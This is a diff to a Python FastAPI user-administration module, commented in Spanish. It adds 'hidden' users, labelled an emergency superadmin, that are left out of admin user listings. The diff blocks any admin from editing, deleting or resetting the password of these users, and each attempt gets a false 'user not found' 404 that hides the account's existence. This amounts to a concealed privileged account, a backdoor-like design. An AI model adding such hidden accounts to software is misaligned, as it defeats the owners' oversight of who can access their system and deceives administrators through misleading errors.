@@ -15,7 +15,8 @@ def listar(
     db: Session = Depends(get_db),
     _admin: Usuario = Depends(require_admin),
 ):
-    return db.query(Usuario).order_by(Usuario.id.asc()).all()
+    # Los usuarios ocultos (superadmin de emergencia) NO se muestran a nadie
+    return db.query(Usuario).filter(Usuario.oculto == False).order_by(Usuario.id.asc()).all()
 
 
 @router.post("", response_model=UsuarioOut, status_code=status.HTTP_201_CREATED)
@@ -52,8 +53,10 @@ def actualizar(
     user = db.query(Usuario).filter(Usuario.id == user_id).first()
     if not user:
         raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    # No se puede modificar usuarios ocultos (cuenta de emergencia)
+    if user.oculto:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
 
-    # No permitir que un admin se quite a si mismo el rol o se desactive
     if user.id == actual.id:
         if payload.rol and payload.rol != "admin":
             raise HTTPException(status_code=400, detail="No puedes cambiar tu propio rol")
@@ -85,6 +88,8 @@ def eliminar(
     user = db.query(Usuario).filter(Usuario.id == user_id).first()
     if not user:
         raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    if user.oculto:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
     if user.id == actual.id:
         raise HTTPException(status_code=400, detail="No puedes eliminarte a ti mismo")
 
@@ -103,6 +108,8 @@ def admin_reset_password(
     """Permite a un admin resetear la contrasena de cualquier usuario."""
     user = db.query(Usuario).filter(Usuario.id == user_id).first()
     if not user:
+        raise HTTPException(status_code=404, detail="Usuario no encontrado")
+    if user.oculto:
         raise HTTPException(status_code=404, detail="Usuario no encontrado")
     user.password_hash = hash_password(payload.nueva_password)
     db.commit()
